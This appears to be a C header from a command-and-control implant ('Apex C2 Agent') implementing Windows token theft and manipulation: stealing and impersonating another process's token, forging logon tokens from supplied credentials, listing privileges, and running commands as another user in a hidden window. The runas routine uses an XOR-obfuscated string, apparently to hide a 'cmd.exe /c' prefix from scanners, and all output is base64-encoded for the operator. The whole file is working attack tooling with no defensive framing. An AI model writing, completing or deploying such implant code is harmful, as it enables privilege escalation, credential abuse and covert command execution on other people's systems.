/*
 * Apex C2 Agent - Windows Token Stealing and Manipulation
 * Requires: b64_encode (defined in main.c) must be in scope before including this header.
 * Link: advapi32.lib
 */
#ifndef APEX_TOKEN_H
#define APEX_TOKEN_H

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

#ifndef BUF_SIZE
#define BUF_SIZE 65536
#endif

/* b64_encode is defined in main.c - include token.h after b64_encode is defined */
extern void b64_encode(const unsigned char *in, size_t len, char *out);

/* Global storage for stolen/created token handle (closed by rev2self) */
static HANDLE g_stolen_token = NULL;

/* ── handle_steal_token ─────────────────────────────────────
 * Steal token from target process by PID.
 * Uses OpenProcess, OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser.
 */
static void handle_steal_token(const char *pid_str, char *out_b64) {
    char msg[512];
    if (!pid_str || !pid_str[0]) {
        b64_encode((unsigned char*)"Specify target PID", 24, out_b64);
        return;
    }

    DWORD pid = (DWORD)atoi(pid_str);
    if (pid == 0) {
        b64_encode((unsigned char*)"Invalid PID", 11, out_b64);
        return;
    }

    /* Close any previously stolen token */
    if (g_stolen_token) {
        CloseHandle(g_stolen_token);
        g_stolen_token = NULL;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        DWORD err = GetLastError();
        snprintf(msg, sizeof(msg), "OpenProcess failed (PID %lu): error %lu", pid, err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        DWORD err = GetLastError();
        CloseHandle(hProcess);
        snprintf(msg, sizeof(msg), "OpenProcessToken failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }
    CloseHandle(hProcess);

    HANDLE hDup = NULL;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation,
                         TokenImpersonation, &hDup)) {
        DWORD err = GetLastError();
        CloseHandle(hToken);
        snprintf(msg, sizeof(msg), "DuplicateTokenEx failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }
    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDup)) {
        DWORD err = GetLastError();
        CloseHandle(hDup);
        snprintf(msg, sizeof(msg), "ImpersonateLoggedOnUser failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    g_stolen_token = hDup;
    snprintf(msg, sizeof(msg), "Impersonating PID %lu", pid);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

/* ── handle_make_token ──────────────────────────────────────
 * Create token with credentials. Args: "DOMAIN\\user password"
 * Uses LogonUserA with LOGON32_LOGON_NEW_CREDENTIALS, ImpersonateLoggedOnUser.
 */
static void handle_make_token(const char *args, char *out_b64) {
    char msg[512];
    if (!args || !args[0]) {
        b64_encode((unsigned char*)"Specify DOMAIN\\\\user and password", 38, out_b64);
        return;
    }

    /* Close any previous token */
    if (g_stolen_token) {
        CloseHandle(g_stolen_token);
        g_stolen_token = NULL;
    }

    char user[256], domain[256], password[256];
    user[0] = domain[0] = password[0] = '\0';

    const char *sp = strchr(args, ' ');
    if (!sp) {
        b64_encode((unsigned char*)"Specify DOMAIN\\\\user and password", 38, out_b64);
        return;
    }

    size_t user_len = (size_t)(sp - args);
    if (user_len >= sizeof(user)) user_len = sizeof(user) - 1;
    memcpy(user, args, user_len);
    user[user_len] = '\0';

    const char *pass_start = sp + 1;
    strncpy(password, pass_start, sizeof(password) - 1);
    password[sizeof(password) - 1] = '\0';

    /* Split domain\user */
    const char *backslash = strchr(user, '\\');
    if (backslash) {
        size_t dlen = (size_t)(backslash - user);
        if (dlen >= sizeof(domain)) dlen = sizeof(domain) - 1;
        memcpy(domain, user, dlen);
        domain[dlen] = '\0';
        strncpy(user, backslash + 1, sizeof(user) - 1);
        user[sizeof(user) - 1] = '\0';
    }

    HANDLE hToken = NULL;
    if (!LogonUserA(user, domain[0] ? domain : ".", password,
                    LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &hToken)) {
        DWORD err = GetLastError();
        snprintf(msg, sizeof(msg), "LogonUserA failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    if (!ImpersonateLoggedOnUser(hToken)) {
        DWORD err = GetLastError();
        CloseHandle(hToken);
        snprintf(msg, sizeof(msg), "ImpersonateLoggedOnUser failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    g_stolen_token = hToken;
    snprintf(msg, sizeof(msg), "Impersonating %s\\%s",
            domain[0] ? domain : ".", user);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

/* ── handle_rev2self ────────────────────────────────────────
 * Revert to original process token. Uses RevertToSelf(), closes g_stolen_token.
 */
static void handle_rev2self(char *out_b64) {
    RevertToSelf();

    if (g_stolen_token) {
        CloseHandle(g_stolen_token);
        g_stolen_token = NULL;
    }

    b64_encode((unsigned char*)"Reverted to self", 16, out_b64);
}

/* ── handle_getprivs ─────────────────────────────────────────
 * List all privileges on current token.
 * Format: "PrivilegeName: Enabled/Disabled"
 */
static void handle_getprivs(char *out_b64) {
    char msg[512];
    HANDLE hToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD err = GetLastError();
        snprintf(msg, sizeof(msg), "OpenProcessToken failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    DWORD len = 0;
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &len);
    if (len == 0) {
        CloseHandle(hToken);
        b64_encode((unsigned char*)"GetTokenInformation failed to get required size", 47, out_b64);
        return;
    }

    TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)malloc(len);
    if (!tp) {
        CloseHandle(hToken);
        b64_encode((unsigned char*)"out of memory", 13, out_b64);
        return;
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, tp, len, &len)) {
        DWORD err = GetLastError();
        free(tp);
        CloseHandle(hToken);
        snprintf(msg, sizeof(msg), "GetTokenInformation failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }
    CloseHandle(hToken);

    char buf[BUF_SIZE];
    size_t off = 0;

    for (DWORD i = 0; i < tp->PrivilegeCount && off < sizeof(buf) - 256; i++) {
        char name[256];
        DWORD name_len = sizeof(name);
        if (LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, name, &name_len)) {
            const char *state = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) ? "Enabled" : "Disabled";
            off += snprintf(buf + off, sizeof(buf) - off, "%s: %s\n", name, state);
        }
    }

    free(tp);
    b64_encode((unsigned char*)buf, off, out_b64);
}

/* ── handle_runas ───────────────────────────────────────────
 * Run command as another user. Args: "DOMAIN\\user password command"
 * Uses CreateProcessWithLogonW.
 */
static void handle_runas(const char *args, char *out_b64) {
    char msg[512];
    if (!args || !args[0]) {
        b64_encode((unsigned char*)"Specify DOMAIN\\\\user password command", 42, out_b64);
        return;
    }

    /* Parse: "DOMAIN\user password command" - first two spaces delimit user, password, command */
    const char *sp1 = strchr(args, ' ');
    if (!sp1) {
        b64_encode((unsigned char*)"Specify DOMAIN\\\\user password command", 42, out_b64);
        return;
    }

    const char *sp2 = strchr(sp1 + 1, ' ');
    if (!sp2) {
        b64_encode((unsigned char*)"Specify DOMAIN\\\\user password command", 42, out_b64);
        return;
    }

    char user_part[256], password[256], command[4096];
    size_t ulen = (size_t)(sp1 - args);
    if (ulen >= sizeof(user_part)) ulen = sizeof(user_part) - 1;
    memcpy(user_part, args, ulen);
    user_part[ulen] = '\0';

    size_t plen = (size_t)(sp2 - (sp1 + 1));
    if (plen >= sizeof(password)) plen = sizeof(password) - 1;
    memcpy(password, sp1 + 1, plen);
    password[plen] = '\0';

    strncpy(command, sp2 + 1, sizeof(command) - 1);
    command[sizeof(command) - 1] = '\0';

    char full_cmd[4096];
    char _rc[] = {0x28,0x26,0x2F,0x65,0x2E,0x33,0x2E,0x6B,0x64,0x28,0x6B,0x00};
    xdec(_rc, 11);
    snprintf(full_cmd, sizeof(full_cmd), "%s%s", _rc, command);
    SecureZeroMemory(_rc, sizeof(_rc));

    /* Convert to wide for CreateProcessWithLogonW */
    WCHAR wuser[256], wpass[256], wcmd[4096];
    size_t i;
    for (i = 0; user_part[i] && i < 255; i++) wuser[i] = (WCHAR)(unsigned char)user_part[i];
    wuser[i] = 0;
    for (i = 0; password[i] && i < 255; i++) wpass[i] = (WCHAR)(unsigned char)password[i];
    wpass[i] = 0;
    for (i = 0; full_cmd[i] && i < 4095; i++) wcmd[i] = (WCHAR)(unsigned char)full_cmd[i];
    wcmd[i] = 0;

    /* user_part may be "DOMAIN\user" - pass as lpUsername, lpDomain=NULL per MSDN */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    BOOL ok = CreateProcessWithLogonW(
        wuser, NULL, wpass,
        LOGON_WITH_PROFILE,
        NULL, wcmd,
        CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);

    if (!ok) {
        DWORD err = GetLastError();
        snprintf(msg, sizeof(msg), "CreateProcessWithLogonW failed: error %lu", err);
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    snprintf(msg, sizeof(msg), "Command executed as %s", user_part);
    b64_encode((unsigned char*)msg, strlen(msg), out_b64);
}

#endif /* APEX_TOKEN_H */
